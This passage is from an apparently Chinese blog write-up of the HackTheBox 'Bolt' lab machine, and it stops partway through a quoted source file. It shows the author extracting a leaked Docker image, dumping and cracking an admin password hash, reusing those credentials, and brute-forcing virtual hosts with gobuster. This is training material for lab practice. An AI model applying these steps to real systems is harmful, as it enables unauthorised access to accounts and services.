@@ -1,0 +1,1975 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox-Bolt - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="HackTheBox-Bolt" />
+<meta property="og:description" content="HackTheBox靶机Bolt" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mi3aka.eu.org/htb-bolt/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-06T14:08:30+00:00" />
+<meta property="article:modified_time" content="2022-01-06T14:08:30+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>
+
+<meta name="twitter:title" content="HackTheBox-Bolt"/>
+<meta name="twitter:description" content="HackTheBox靶机Bolt"/>
+<meta name="application-name" content="Mi3aka&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/htb-bolt/" /><link rel="prev" href="https://mi3aka.eu.org/htb-archetype/" /><link rel="next" href="https://mi3aka.eu.org/htb-forge/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox-Bolt",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mi3aka.eu.org\/htb-bolt\/"
+        },"genre": "posts","wordcount":  5420 ,
+        "url": "https:\/\/mi3aka.eu.org\/htb-bolt\/","datePublished": "2022-01-06T14:08:30+00:00","dateModified": "2022-01-06T14:08:30+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Mi3aka"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox-Bolt</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-06">2022-01-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 5420 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 11 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期工作">前期工作</a></li>
+    <li><a href="#分析压缩包">分析压缩包</a></li>
+    <li><a href="#分析网站结构">分析网站结构</a></li>
+    <li><a href="#模板注入获取user权限">模板注入获取user权限</a></li>
+    <li><a href="#获取root权限">获取root权限</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="前期工作">前期工作</h2>
+<p>nmap扫描结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292037992.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292037992.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292037992.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292037992.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292037992.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292037992.png" /></p>
+<p>把<code>10.10.11.114    bolt.htb</code>和<code>10.10.11.114    passbolt.bolt.htb</code>加到<code>/etc/hosts</code>中</p>
+<p><a href="http://passbolt.bolt.htb/uploads/image.tar" target="_blank" rel="noopener noreffer ">http://passbolt.bolt.htb/uploads/image.tar</a>有个压缩包可以下载</p>
+<h2 id="分析压缩包">分析压缩包</h2>
+<p>在<code>image/745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py</code>中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Copyright (c) 2019 - present AppSeed.us
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span>   <span class="nn">decouple</span> <span class="kn">import</span> <span class="n">config</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Config</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">basedir</span>    <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Set up the App SECRET_KEY</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="n">config</span><span class="p">(</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;S#perS3crEt_007&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># This will create a file in &lt;app&gt; FOLDER</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SQLALCHEMY_DATABASE_URI</span> <span class="o">=</span> <span class="s1">&#39;sqlite:///&#39;</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">basedir</span><span class="p">,</span> <span class="s1">&#39;db.sqlite3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SQLALCHEMY_TRACK_MODIFICATIONS</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MAIL_SERVER</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MAIL_PORT</span> <span class="o">=</span> <span class="mi">25</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MAIL_USE_TLS</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MAIL_USE_SSL</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MAIL_USERNAME</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MAIL_PASSWORD</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DEFAULT_MAIL_SENDER</span> <span class="o">=</span> <span class="s1">&#39;support@bolt.htb&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ProductionConfig</span><span class="p">(</span><span class="n">Config</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Security</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SESSION_COOKIE_HTTPONLY</span>  <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="n">REMEMBER_COOKIE_HTTPONLY</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="n">REMEMBER_COOKIE_DURATION</span> <span class="o">=</span> <span class="mi">3600</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># PostgreSQL database</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SQLALCHEMY_DATABASE_URI</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">://</span><span class="si">{}</span><span class="s1">:</span><span class="si">{}</span><span class="s1">@</span><span class="si">{}</span><span class="s1">:</span><span class="si">{}</span><span class="s1">/</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="p">(</span> <span class="s1">&#39;DB_ENGINE&#39;</span>   <span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;postgresql&#39;</span>    <span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="p">(</span> <span class="s1">&#39;DB_USERNAME&#39;</span> <span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;appseed&#39;</span>       <span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="p">(</span> <span class="s1">&#39;DB_PASS&#39;</span>     <span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;pass&#39;</span>          <span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="p">(</span> <span class="s1">&#39;DB_HOST&#39;</span>     <span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span>     <span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="p">(</span> <span class="s1">&#39;DB_PORT&#39;</span>     <span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">5432</span>            <span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="p">(</span> <span class="s1">&#39;DB_NAME&#39;</span>     <span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;appseed-flask&#39;</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DebugConfig</span><span class="p">(</span><span class="n">Config</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Load all possible configurations</span>
+</span></span><span class="line"><span class="cl"><span class="n">config_dict</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Production&#39;</span><span class="p">:</span> <span class="n">ProductionConfig</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Debug&#39;</span>     <span class="p">:</span> <span class="n">DebugConfig</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2</code>中有个<code>db.sqlite3</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt install sqlite3
+</span></span><span class="line"><span class="cl">sqlite3 db.sqlite3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sqlite&gt; .show
+</span></span><span class="line"><span class="cl">        echo: off
+</span></span><span class="line"><span class="cl">         eqp: off
+</span></span><span class="line"><span class="cl">     explain: auto
+</span></span><span class="line"><span class="cl">     headers: off
+</span></span><span class="line"><span class="cl">        mode: list
+</span></span><span class="line"><span class="cl">   nullvalue: &#34;&#34;
+</span></span><span class="line"><span class="cl">      output: stdout
+</span></span><span class="line"><span class="cl">colseparator: &#34;|&#34;
+</span></span><span class="line"><span class="cl">rowseparator: &#34;\n&#34;
+</span></span><span class="line"><span class="cl">       stats: off
+</span></span><span class="line"><span class="cl">       width: 
+</span></span><span class="line"><span class="cl">    filename: db.sqlite3
+</span></span><span class="line"><span class="cl">sqlite&gt; .database
+</span></span><span class="line"><span class="cl">main: /home/kali/Downloads/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3
+</span></span><span class="line"><span class="cl">sqlite&gt; .tables
+</span></span><span class="line"><span class="cl">User
+</span></span><span class="line"><span class="cl">sqlite&gt; .schema User
+</span></span><span class="line"><span class="cl">CREATE TABLE IF NOT EXISTS &#34;User&#34; (
+</span></span><span class="line"><span class="cl">	id INTEGER NOT NULL, 
+</span></span><span class="line"><span class="cl">	username VARCHAR, 
+</span></span><span class="line"><span class="cl">	email VARCHAR, 
+</span></span><span class="line"><span class="cl">	password BLOB, 
+</span></span><span class="line"><span class="cl">	email_confirmed BOOLEAN, 
+</span></span><span class="line"><span class="cl">	profile_update VARCHAR(80), 
+</span></span><span class="line"><span class="cl">	PRIMARY KEY (id), 
+</span></span><span class="line"><span class="cl">	UNIQUE (username), 
+</span></span><span class="line"><span class="cl">	UNIQUE (email)
+</span></span><span class="line"><span class="cl">);
+</span></span><span class="line"><span class="cl">sqlite&gt; select * from User;
+</span></span><span class="line"><span class="cl">1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292124162.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292124162.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292124162.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292124162.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292124162.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292124162.png" /></p>
+<p>有个hash之后的密码,反查得知其为<code>deadbolt</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292127456.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292127456.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292127456.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292127456.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292127456.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292127456.png" /></p>
+<h2 id="分析网站结构">分析网站结构</h2>
+<p>成功以<code>admin:deadbolt</code>登录<code>bolt.htb</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292129924.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292129924.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292129924.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292129924.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292129924.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292129924.png" /></p>
+<p>但是好像没找到可以利用的点</p>
+<p>尝试以<code>admin@bolt.htb:deadbolt</code>登录<code>passbolt.bolt.htb</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292135767.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292135767.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292135767.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292135767.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292135767.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292135767.png" /></p>
+<p>尝试以此进行ssh连接同样失败</p>
+<p>推测可能存在其他子域名,用gobuster去爆破<code>./gobuster vhost -u http://bolt.htb -w /mnt/hgfs/Exploits/subdomains-top1million-110000.txt -t 100</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Found: demo.bolt.htb (Status: 302) [Size: 219]
+</span></span><span class="line"><span class="cl">Found: mail.bolt.htb (Status: 200) [Size: 4943]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>demo.bolt.htb</code>跟<code>bolt.htb</code>的登录框一样,但是无法登录</p>
+<p>在<a href="http://demo.bolt.htb/register" target="_blank" rel="noopener noreffer ">注册页面</a>多了一个邀请码</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292145113.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292145113.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292145113.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292145113.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292145113.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292145113.png" /></p>
+<p>全局搜索<code>Invite Code</code>,发现其在<code>image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py</code>中出现</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">Copyright (c) 2019 - present AppSeed.us
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask_wtf</span> <span class="kn">import</span> <span class="n">FlaskForm</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">wtforms</span> <span class="kn">import</span> <span class="n">TextField</span><span class="p">,</span> <span class="n">PasswordField</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">wtforms.validators</span> <span class="kn">import</span> <span class="n">InputRequired</span><span class="p">,</span> <span class="n">Email</span><span class="p">,</span> <span class="n">DataRequired</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## login and registration</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">LoginForm</span><span class="p">(</span><span class="n">FlaskForm</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">TextField</span>    <span class="p">(</span><span class="s1">&#39;Username&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;username_login&#39;</span>   <span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">()])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">PasswordField</span><span class="p">(</span><span class="s1">&#39;Password&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;pwd_login&#39;</span>        <span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">()])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">CreateAccountForm</span><span class="p">(</span><span class="n">FlaskForm</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">TextField</span><span class="p">(</span><span class="s1">&#39;Username&#39;</span>     <span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;username_create&#39;</span> <span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">()])</span>
